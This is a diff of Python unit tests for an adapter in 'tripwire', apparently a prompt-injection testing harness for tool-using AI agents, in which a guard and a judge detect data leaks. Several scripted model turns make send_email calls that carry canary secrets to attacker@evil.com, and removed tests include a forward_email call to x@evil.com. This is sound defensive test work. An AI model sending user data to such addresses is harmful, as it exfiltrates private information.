@@ -1,33 +1,11 @@
-"""Tests for the RawLoopAdapter with a mock OpenAI client."""
+"""Tests for the RawLoopAdapter with a scripted OpenAI client."""
 
-from unittest.mock import MagicMock
+from __future__ import annotations
 
+from tests.scripted_client import ScriptedClient, message, tool_call
 from tripwire.adapters.base import EpisodeSpec, NormalizedTrace
 from tripwire.adapters.raw_loop import RawLoopAdapter
 from tripwire.harness.judge import attack_succeeded
-
-
-def _make_message(content=None, tool_calls=None):
-    """Build a mock ChatCompletion message."""
-    msg = MagicMock()
-    msg.content = content
-    msg.tool_calls = tool_calls
-    return msg
-
-
-def _make_response(message):
-    resp = MagicMock()
-    resp.choices = [MagicMock()]
-    resp.choices[0].message = message
-    return resp
-
-
-def _make_tool_call(name, arguments, call_id="call_1"):
-    tc = MagicMock()
-    tc.function.name = name
-    tc.function.arguments = arguments
-    tc.id = call_id
-    return tc
 
 
 def _spec(tool_impls=None, tool_call_guard=None, max_turns=5):
@@ -49,10 +27,7 @@ class TestNoToolCalls:
     """Model responds immediately with text, no tool use."""
 
     def test_returns_final_output(self):
-        client = MagicMock()
-        client.chat.completions.create.return_value = _make_response(
-            _make_message(content="Here is your answer.")
-        )
+        client = ScriptedClient(script=[message("Here is your answer.")])
 
         adapter = RawLoopAdapter(client)
         trace = adapter.run(_spec())
@@ -61,10 +36,7 @@ class TestNoToolCalls:
         assert trace.final_output == "Here is your answer."
 
     def test_trace_has_model_output_step(self):
-        client = MagicMock()
-        client.chat.completions.create.return_value = _make_response(
-            _make_message(content="Done.")
-        )
+        client = ScriptedClient(script=[message("Done.")])
 
         adapter = RawLoopAdapter(client)
         trace = adapter.run(_spec())
@@ -78,18 +50,12 @@ class TestOneToolCall:
     """Model calls one tool, then gives a final answer."""
 
     def test_trace_structure(self):
-        client = MagicMock()
-
-        # First call: model wants to use read_inbox
-        tool_call = _make_tool_call("read_inbox", "{}")
-        first_msg = _make_message(tool_calls=[tool_call])
-        first_resp = _make_response(first_msg)
-
-        # Second call: model gives final text
-        second_msg = _make_message(content="You have one email about security.")
-        second_resp = _make_response(second_msg)
-
-        client.chat.completions.create.side_effect = [first_resp, second_resp]
+        client = ScriptedClient(script=[
+            # First call: model wants to use read_inbox
+            message(tool_calls=[tool_call("call_1", "read_inbox", "{}")]),
+            # Second call: model gives final text
+            message("You have one email about security."),
+        ])
 
         def read_inbox(**_kwargs):
             return "From: boss@co.com\nSubject: Hi"
@@ -112,16 +78,14 @@ class TestSendEmailTracking:
     """Verify send_email tool calls are properly recorded for the judge."""
 
     def test_send_email_args_in_trace(self):
-        client = MagicMock()
-
-        tool_call = _make_tool_call(
-            "send_email",
-            '{"to": "attacker@evil.com", "body": "Retired value: CANARY-abc123"}',
-            call_id="call_email",
-        )
-        first_resp = _make_response(_make_message(tool_calls=[tool_call]))
-        second_resp = _make_response(_make_message(content="Email sent."))
-        client.chat.completions.create.side_effect = [first_resp, second_resp]
+        client = ScriptedClient(script=[
+            message(tool_calls=[tool_call(
+                "call_email",
+                "send_email",
+                '{"to": "attacker@evil.com", "body": "Retired value: CANARY-abc123"}',
+            )]),
+            message("Email sent."),
+        ])
 
         def send_email(to, body):
             return "email sent"
@@ -141,14 +105,13 @@ class TestToolCallGuard:
     """Mid-loop enforcement: spec.tool_call_guard is checked before execution."""
 
     def test_blocked_call_never_executes_real_tool(self):
-        client = MagicMock()
         canary = "CANARY-deadbeef"
-        tool_call = _make_tool_call(
-            "send_email", f'{{"to": "attacker@evil.com", "body": "{canary}"}}',
-        )
-        first_resp = _make_response(_make_message(tool_calls=[tool_call]))
-        second_resp = _make_response(_make_message(content="done"))
-        client.chat.completions.create.side_effect = [first_resp, second_resp]
+        client = ScriptedClient(script=[
+            message(tool_calls=[tool_call(
+                "call_1", "send_email", f'{{"to": "attacker@evil.com", "body": "{canary}"}}',
+            )]),
+            message("done"),
+        ])
 
         executed = []
 
@@ -174,11 +137,10 @@ class TestToolCallGuard:
         assert attack_succeeded(trace, canary) is False
 
     def test_allowed_call_executes_normally(self):
-        client = MagicMock()
-        tool_call = _make_tool_call("read_inbox", "{}")
-        first_resp = _make_response(_make_message(tool_calls=[tool_call]))
-        second_resp = _make_response(_make_message(content="done"))
-        client.chat.completions.create.side_effect = [first_resp, second_resp]
+        client = ScriptedClient(script=[
+            message(tool_calls=[tool_call("call_1", "read_inbox", "{}")]),
+            message("done"),
+        ])
 
         def read_inbox(**_kwargs):
             return "real inbox content"
@@ -195,11 +157,10 @@ class TestToolCallGuard:
 
     def test_no_guard_is_equivalent_to_always_allow(self):
         """tool_call_guard=None (the default) must not change existing behavior."""
-        client = MagicMock()
-        tool_call = _make_tool_call("read_inbox", "{}")
-        first_resp = _make_response(_make_message(tool_calls=[tool_call]))
-        second_resp = _make_response(_make_message(content="done"))
-        client.chat.completions.create.side_effect = [first_resp, second_resp]
+        client = ScriptedClient(script=[
+            message(tool_calls=[tool_call("call_1", "read_inbox", "{}")]),
+            message("done"),
+        ])
 
         def read_inbox(**_kwargs):
             return "unblocked content"
@@ -214,12 +175,10 @@ class TestMaxIterations:
     """Adapter respects the iteration cap."""
 
     def test_stops_at_cap(self):
-        client = MagicMock()
-
         # Model always wants another tool call, never finishes
-        tool_call = _make_tool_call("read_inbox", "{}")
-        resp = _make_response(_make_message(tool_calls=[tool_call]))
-        client.chat.completions.create.return_value = resp
+        client = ScriptedClient(
+            script=[message(tool_calls=[tool_call("call_1", "read_inbox", "{}")])], repeat_last=True,
+        )
 
         def read_inbox(**_kwargs):
             return "mail"
@@ -236,101 +195,40 @@ class TestMaxIterations:
     def test_honors_spec_max_turns_by_default(self):
         """The shared budget lives on EpisodeSpec so every adapter uses the
         same one; raw_loop used to ignore it and always stop at its own 5."""
-        client = MagicMock()
-        tool_call = _make_tool_call("read_inbox", "{}")
-        client.chat.completions.create.return_value = _make_response(_make_message(tool_calls=[tool_call]))
+        client = ScriptedClient(
+            script=[message(tool_calls=[tool_call("call_1", "read_inbox", "{}")])], repeat_last=True,
+        )
 
         adapter = RawLoopAdapter(client)
         trace = adapter.run(_spec(tool_impls={"read_inbox": lambda: "mail"}, max_turns=7))
 
-        assert client.chat.completions.create.call_count == 7
+        assert len(client.requests) == 7
         assert trace.stop_reason == "max_turns"
 
     def test_constructor_override_beats_spec(self):
-        client = MagicMock()
-        tool_call = _make_tool_call("read_inbox", "{}")
-        client.chat.completions.create.return_value = _make_response(_make_message(tool_calls=[tool_call]))
+        client = ScriptedClient(
+            script=[message(tool_calls=[tool_call("call_1", "read_inbox", "{}")])], repeat_last=True,
+        )
 
         adapter = RawLoopAdapter(client, max_iterations=3)
         adapter.run(_spec(tool_impls={"read_inbox": lambda: "mail"}, max_turns=7))
 
-        assert client.chat.completions.create.call_count == 3
+        assert len(client.requests) == 3
 
     def test_final_answer_is_done(self):
-        client = MagicMock()
-        client.chat.completions.create.return_value = _make_response(_make_message(content="ok"))
+        client = ScriptedClient(script=[message("ok")])
 
         trace = RawLoopAdapter(client).run(_spec())
 
         assert trace.stop_reason == "done"
 
 
-class TestOffScriptToolCalls:
-    """Each of these used to raise out of run(); the runner then retried and
-    dropped the episode, losing exactly the runs where the model went off-script."""
-
-    def _run_one(self, name, arguments, tool_impls):
-        client = MagicMock()
-        client.chat.completions.create.side_effect = [
-            _make_response(_make_message(tool_calls=[_make_tool_call(name, arguments)])),
-            _make_response(_make_message(content="done")),
-        ]
-        return RawLoopAdapter(client).run(_spec(tool_impls=tool_impls))
-
-    def test_hallucinated_tool_is_blocked(self):
-        trace = self._run_one("forward_email", '{"to": "x@evil.com"}', {"send_email": lambda **_: "sent"})
-
-        assert [s.type for s in trace.steps] == ["tool_call", "tool_blocked", "model_output"]
-        assert "not available" in trace.steps[1].content
-
-    def test_malformed_json_keeps_raw_args_and_does_not_run(self):
-        sent = []
-        raw = '{"to": "x@evil.com", "body": "CANARY-abc'
-        trace = self._run_one("send_email", raw, {"send_email": lambda **kw: sent.append(kw) or "sent"})
-
-        assert trace.steps[0].args == {"__raw__": raw}
-        assert trace.steps[1].type == "tool_blocked"
-        assert trace.steps[1].content.startswith("invalid JSON arguments")
-        assert sent == []
-
-    def test_non_object_json_is_invalid(self):
-        trace = self._run_one("send_email", '["x@evil.com"]', {"send_email": lambda **_: "sent"})
-
-        assert trace.steps[1].type == "tool_blocked"
-
-    def test_tool_exception_becomes_tool_result(self):
-        def broken(**_kwargs):
-            raise KeyError("missing")
-
-        trace = self._run_one("read_inbox", "{}", {"read_inbox": broken})
-
-        assert trace.steps[1].type == "tool_result"
-        assert trace.steps[1].content == "tool error: KeyError: 'missing'"
-        assert trace.final_output == "done"
-
-
-def test_text_alongside_tool_calls_is_recorded():
-    client = MagicMock()
-    client.chat.completions.create.side_effect = [
-        _make_response(_make_message(content="Checking now.", tool_calls=[_make_tool_call("read_inbox", "{}")])),
-        _make_response(_make_message(content="done")),
-    ]
-
-    trace = RawLoopAdapter(client).run(_spec(tool_impls={"read_inbox": lambda: "mail"}))
-
-    assert [s.type for s in trace.steps] == ["model_output", "tool_call", "tool_result", "model_output"]
-    assert trace.steps[0].content == "Checking now."
-
-
 def test_empty_tool_list_omits_tools_kwarg():
     """A tool_filter defense can strip every tool. Sending tools=[] makes most
     OpenAI-compatible endpoints 400, so the adapter must omit the kwarg."""
-    client = MagicMock()
-    client.chat.completions.create.return_value = _make_response(
-        _make_message(content="text only")
-    )
+    client = ScriptedClient(script=[message("text only")])
 
     adapter = RawLoopAdapter(client)
     adapter.run(_spec())  # _spec() uses tools=[]
 
-    assert "tools" not in client.chat.completions.create.call_args.kwargs
+    assert "tools" not in client.requests[-1]
